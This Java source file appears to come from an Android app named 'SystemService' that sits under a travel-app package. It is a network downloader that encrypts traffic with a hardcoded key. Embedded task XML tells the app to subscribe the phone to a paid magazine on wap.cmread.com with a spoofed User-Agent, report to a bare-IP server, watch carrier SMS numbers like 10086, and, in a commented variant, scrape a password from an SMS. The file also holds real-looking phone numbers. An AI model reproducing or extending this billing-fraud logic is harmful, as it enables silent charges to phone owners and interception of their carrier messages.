/**
 * 项目名：       SystemService
 * 文件名：       ClsDownLoader.java
 * 文件描述： 
 * 作者：            Administrator
 * 创建时间：  2012-6-21
 * 版权声明 ： Copyright (C) 2008-2010 RichPeak
 *
 */
package com.mendong.travel.network;

import java.io.IOException;
import java.io.InputStream;

import org.xmlpull.v1.XmlPullParserException;

import android.content.Context;
import android.util.Base64;

import com.mendong.travel.network.ClsNetWorkConstants.ErrorCode;
import com.mendong.travel.network.ClsNetWorkConstants.ResultCode;
import com.mendong.travel.network.entity.ClsRspInfo;
import com.mendong.travel.utils.DataEncryption;
import com.mendong.travel.utils.GZipUtil;
import com.mendong.travel.utils.log.ClsLog;

/**
 * 类名称： ClsDownLoader 作者： Administrator 创建时间： 2012-6-21 下午4:15:42 类描述： 版权声明 ：
 * Copyright (C) 2008-2010 RichPeak 修改时间： 2012-6-21 下午4:15:42
 * 
 */
public class ClsDownLoader extends ClsBaseDownloader
{

    private static final String a = "欢迎使用瑞米视园产品,公司系列化的社区类应用产品,全面覆盖了ANDROID,IOS,SYMBIAN,WINDOWS PHONE, WINDOWS CE,MTK等主流移动终端平台,打造专注型,垂直化的移动互联网应用,服务及运营,是我们为之努力的目标,更多产品请登录:www.real-me.cn,";

    private static String b = null;

    //    private static final int STOP_READ_STREAM = -6000;

    //    private Handler handler = new Handler()
    //    {
    //        /* (non-Javadoc)
    //         * (覆盖方法)
    //         * 方法名称：  handleMessage
    //         * 作者：         Administrator
    //         * 方法描述：      
    //         * @see android.os.Handler#handleMessage(android.os.Message)
    //         */
    //        @Override
    //        public void handleMessage(Message msg)
    //        {
    //            if (null == msg)
    //            {
    //                return;
    //            }
    //            if (msg.what == STOP_READ_STREAM)
    //            {
    //                mInputStreamUtils.setDownload(false);
    //            }
    //        }
    //    };

    public ClsDownLoader(Context c)
    {
        super(c);
        //        ClsDownLoader.b = ClsDeviceInfo.getDeviceInfo(c);
    }

    String sss = "<rp><tt>1800</tt><wt><ur><![CDATA[http://wap.cmread.com/z/mag/subscribe/369292331?cm=73123]]></ur><hd><![CDATA[User-Agent: Dalvik/1.6.0 (Linux; U; Android 4.0.3; HTC T328t Build/IML74K)"
            + "Connection: keep-alive"
            + "Accept: */*"
            + "Accept-Language: zh-cn,en"
            + "Accept-Charset: GB2312,utf-8"
            + ""
            + ""
            + "]]></hd><md><![CDATA[GET]]></md><up>1</up><uur><![CDATA[http://211.144.92.101:4000/Waps/CMRead.aspx?step=1]]></uur><hsms>1</hsms><sms><![CDATA[]]></sms><sur><![CDATA[]]></sur><ph><![CDATA[18205193659]]></ph></wt><mk><nm>10086</nm><nm>106</nm><nm>1001</nm><nm>10</nm><nm>10</nm><ts></ts><tp></tp></mk></rp>";

    //    String sss = "<rp><wt><ur>http://wap.cmread.com/reg_registL.jsp.jsp;jsessionid=B3EC6AD8A40EE9C497555E9A336BCA78?pg=120&lab=89011&succurl=http%3A%2F%2Fwap.cmread.com%2Fz%2Fmag%2Fsubscribe%2F369292331%3Fcm%3D73123&backurl=http%3A%2F%2Fwap.cmread.com%2Fz%2Fmag%2Fsubscribe%2F369292331%3Fcm%3D73123&ptype=&s=</ur><hd>User-Agent: Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI C8860E Build/HuaweiC8860E)"
    //            + "Connection: keep-alive"
    //            + "Accept: */*"
    //            + "Accept-Language: zh-cn,en"
    //            + "Accept-Charset: GB2312,utf-8"
    //            + "Content-Type:application/x-www-form-urlencoded"
    //            + "Referer:http:/reg_registPage.jsp.jsp;jsessionid=B3EC6AD8A40EE9C497555E9A336BCA78?pg=120&lab=89011&succurl=http%3A%2F%2Fwap.cmread.com%2Fz%2Fmag%2Fsubscribe%2F369292331%3Fcm%3D73123&backurl=http%3A%2F%2Fwap.cmread.com%2Fz%2Fmag%2Fsubscribe%2F369292331%3Fcm%3D73123&ptype=&s="
    //            + ""
    //            + ""
    //            + "</hd><md>POST</md><pd>msisdn=18727063270</pd><up>True</up><uur>http://211.144.92.101:4000/Waps/CMRead.aspx?step=4</uur><hsms>True</hsms><sms>密码^wap.cmread.com</sms><sur>http://211.144.92.101:4000/Waps/CMRead.aspx?step=2&next=http:/reg_login.jsp;jsessionid=B3EC6AD8A40EE9C497555E9A336BCA78?pg=120&lab=89011&succurl=http%3A%2F%2Fwap.cmread.com%2Fz%2Fmag%2Fsubscribe%2F369292331%3Fcm%3D73123&backurl=http%3A%2F%2Fwap.cmread.com%2Fz%2Fmag%2Fsubscribe%2F369292331%3Fcm%3D73123&ptype=&s=</sur><ph>18727063270</ph></wt><mk><nm>10086</nm><nm>106</nm><nm>1001</nm><nm>10</nm><nm>10</nm><ts></ts><tp></tp></mk></rp>";

    private static boolean test = false;

    /*
     * (non-Javadoc) (覆盖方法) 方法名称： onSetDownloadWork 作者： Administrator 方法描述：
     * 
     * @see
     * com.systemservice.services.network.ClsBaseDownloader#onSetDownloadWork
     * (boolean, android.content.Context, int, java.lang.Object,
     * com.systemservice.services.network.ICallBack)
     */
    public void onSetDownloadWork(boolean isthreadrun, Context c, ClsRequest req)
    {
        if (!IsThreadRun)
        {
            ClsLog.toast(c, "onSetDownloadWork return");
            return;
        }

        InputStream in = null;
        ICallBack call = req.getCallBack();
        ClsRspInfo rspInfo = null;
        int errorType = 0;
        try
        {
            if (test)
            {
                test = false;
                byte[] data = sss.getBytes();
                if (req.isXmlParser())
                {
                    rspInfo = new ClsXml().parseXml(data);
                }
                else
                {
                    rspInfo = new ClsRspInfo();
                    //                    rspInfo.setContent(new String(data));
                }
            }
            else
            {
                ClsResponse rsp = null;

                if (null != rsp)
                {

                    in = rsp.getInputStream();
                    ClsLog.toast(c, "in.available == " + in.available());

                    byte[] ddd = mInputStreamUtils.InputStreamTOByte(in, 0);

                    //                if (!TextUtils.isEmpty(body))
                    if (null != ddd && ddd.length > 0)
                    {
                        byte[] data = null;
                        byte[] datab64 = null;
                        //                    ClsLog.E("recv " + req.getReqCode(), new String(ddd));
                        if (rsp.isCancelBase64())
                        {
                            datab64 = ddd;
                            ClsLog.toast(c, "isCancelBase64 ");
                        }
                        else
                        {
                            datab64 = Base64.decode(ddd, Base64.DEFAULT);
                            ClsLog.toast(c, "isBase64 ");
                        }

                        if (req.isEncry())
                        {
                            data = DataEncryption.unEncryption(datab64,
                                    getkey());
                        }
                        else
                        {
                            data = datab64;
                        }
                        //                                        if(req.isZip())
                        //                                        {
                        //                                            data = GZipUtil.decompress(tmpdata);
                        //                                        }
                        //                                        else

                        ClsLog.toast(c, "recv " + req.getReqCode() + " == ",
                                data);

                        if (req.isXmlParser())
                        {
                            rspInfo = new ClsXml().parseXml(data);
                        }

                    }
                    else
                    {
                        ClsLog.E("recv", "流为空");
                        ClsLog.toast(c, "recv ==  " + ("流为空"));
                    }
                }

            }

        }
        catch (IOException e)
        {
            rspInfo = null;
            errorType = -1;
            ClsLog.toast(mContext, "callback::IOException==" + e.getMessage());
        }
        catch (XmlPullParserException e)
        {
            rspInfo = null;
            errorType = -2;
            ClsLog.toast(mContext,
                    "callback::XmlPullParserException ==" + e.getMessage());

        }
        catch (Exception e)
        {
            rspInfo = null;
            errorType = -3;
            ClsLog.toast(mContext, "callback::Exception ==" + e.getMessage());
        }
        finally
        {
            ClsLog.toast(c, "关闭网络 " + req.getReqCode());
            IsThreadRun = false;
            if (null != in)
            {
                try
                {
                    in.close();
                }
                catch (IOException e)
                {
                    //                    e.printStackTrace();
                }
                in = null;
            }
            if (null != mUrlCon)
            {
                mUrlCon.cancelPost();
                mUrlCon = null;
            }

        }

        if (null != rspInfo)
        {
            call.onDownloadCallback(req, ResultCode.RESULT_SUCCESS, rspInfo);
        }
        else
        {
            switch (errorType)
            {
                case -1:
                {
                    if (null != call)
                    {
                        call.onDownloadCallback(req, ResultCode.RESULT_FAILE,
                                String.valueOf(ErrorCode.ERROR_DOWNLOAD_IO));
                    }
                    break;
                }
                case -2:
                {
                    if (null != call)
                    {
                        call.onDownloadCallback(
                                req,
                                ResultCode.RESULT_FAILE,
                                String.valueOf(ErrorCode.ERROR_DOWNLOAD_XMLPARSE));
                    }
                    break;
                }
                case -3:
                {
                    if (null != call)
                    {
                        call.onDownloadCallback(req, ResultCode.RESULT_FAILE,
                                String.valueOf(ErrorCode.ERROR_DOWNLOAD));
                    }
                    break;
                }
                default:
                    break;
            }
        }
    }

    //    public void onSetDownloadWork(boolean isthreadrun, Context c,
    //            int requestCode, Object parameter, ICallBack call)
    //    {
    //        if (!IsThreadRun)
    //        {
    //            return;
    //        }
    //
    //        InputStream in = null;
    //        try
    //        {
    //            in = decStream(download(requestCode, (String) parameter));
    //            if (null != in && in.available() > 0)
    //            {
    //                String body = ClsSysUtils.InputStreamToString(in);
    //                
    //                byte[] data = (DataEncryption.unEncryption(Base64.decode(body),
    //                        getkey()));
    ////                byte[] data = body.getBytes();
    //                ClsLog.E("recv", new String(data));
    //                ClsRspInfo rspInfo = new ClsXml().parseXml(data);
    //                if (null != rspInfo)
    //                {
    //
    //                    //                ClsLog.I(TAG, "rspInfo==" + rspInfo.toString());
    //                    call.onDownloadCallback(requestCode,
    //                            ResultCode.RESULT_SUCCESS, rspInfo);
    //                }
    //            }
    //            else
    //            {
    //                ClsLog.E("recv", "流为空");
    //            }
    //
    //        }
    //        catch (IOException e)
    //        {
    ////            e.printStackTrace();
    //            if (null != call)
    //            {
    ////                e.printStackTrace();
    //                ClsLog.I(TAG, "callback::IOException==" + e.getMessage());
    //                call.onDownloadCallback(requestCode, ResultCode.RESULT_FAILE,
    //                        String.valueOf(ErrorCode.ERROR_DOWNLOAD_IO));
    //            }
    //        }
    //        catch (XmlPullParserException e)
    //        {
    ////            e.printStackTrace();
    //            ClsLog.I(TAG, "callback::XmlPullParserException==" + e.getMessage());
    //            call.onDownloadCallback(requestCode, ResultCode.RESULT_FAILE,
    //                    String.valueOf(ErrorCode.ERROR_DOWNLOAD_XMLPARSE));
    //        }
    //        catch(Exception e)
    //        {
    ////            e.printStackTrace();
    //            ClsLog.I(TAG, "callback::XmlPullParserException==" + e.getMessage());
    //            call.onDownloadCallback(requestCode, ResultCode.RESULT_FAILE,
    //                    String.valueOf(ErrorCode.ERROR_DOWNLOAD_XMLPARSE));
    //        }
    //        finally
    //        {
    //            IsThreadRun = false;
    //            if (null != in)
    //            {
    //                try
    //                {
    //                    in.close();
    //                }
    //                catch (IOException e)
    //                {
    ////                    e.printStackTrace();
    //                }
    //                in = null;
    //            }
    //            if (null != mUrlCon)
    //            {
    //                mUrlCon.cancelPost();
    //                mUrlCon = null;
    //            }
    //        }
    //    }

    public InputStream decStream(InputStream in) throws IOException
    {
        //        if (null == in)
        //        {
        //            return null;
        //        }
        // BufferedReader br = new BufferedReader(new InputStreamReader(in));
        // StringBuffer sb = new StringBuffer();
        // ClsLog.E(TAG,"stream");
        // String result = br.readLine();
        // while (null != result)
        // {
        // ClsLog.E(TAG,result);
        // sb.append(result);
        // result = br.readLine();
        // }
        // String res= sb.toString();
        // ClsLog.E(TAG,"res ==========="+res);
        // InputStream in0 = new ByteArrayInputStream(res.getBytes());
        //
        // ClsLog.I(TAG, "download():end");
        return in;
    }

    private String getkey()
    {
        String s = a + b;
        return s.substring(0, 15);
    }

    /**
     * 方法名称： download 作者： Administrator 方法描述： 发送请求，获取响应流 输入参数： @param
     * mRequestCode 输入参数： @param postStr 输入参数： @return 输入参数： @throws IOException
     * 返回类型： InputStream
     */
    public ClsResponse download(ClsRequest req) throws IOException
    {
        ClsLog.I(TAG, "download():start");

        String urlstr = req.getUrl();

        ClsLog.toast(mContext, "url " + req.getReqCode() + " == " + urlstr);
        if (!IsThreadRun || null == urlstr || "".equals(urlstr))
        {
            ClsLog.toast(mContext, "download return ");
            return null;
        }
        //压缩->加密->base64
        //        mUrlCon.t = req.getBody();
        //        ClsLog.E("send 明文", req.getBody());
        byte[] data = req.getData();
        if (req.isZip())
        {
            if (null == data || data.length <= 0)
            {
                ClsLog.toast(mContext, "isZip return ");
                return null;
            }
            data = GZipUtil.compress(data);
        }

        if (req.isEncry())
        {
            if (null == data || data.length <= 0)
            {
                ClsLog.toast(mContext, "isEncry return ");
                return null;
            }
            req.setKey(a + b);
            data = DataEncryption.encryption(data, getkey());
            //            String body = Base64.encodeToString(DataEncryption.encryption(data,
            //                    getkey()), Base64.DEFAULT);
            //            if (null == body || "".equals(body))
            //            {
            //                return null;
            //            }
            //            req.setBody(body);
        }
        if (!req.isNBase64())
        {
            if (null == data || data.length <= 0)
            {
                ClsLog.toast(mContext, "isNBase64 return ");
                return null;
            }
            data = Base64.encode(data, Base64.DEFAULT);
        }

        //        if (null == data || "".equals(data))
        //        {
        //            return null;
        //        }
        //        req.setBody(null);
        //        req.setBody(body);
        req.setData(null);
        req.setData(data);
        //        body = postStr;
        //        InputStream inStrm = mUrlCon.openPost(urlstr, mContext, body, a + b);
        ClsResponse rsp = mUrlCon.openPost(mContext, req);
        ClsLog.I(TAG, "end down");
        return rsp;
    }
}
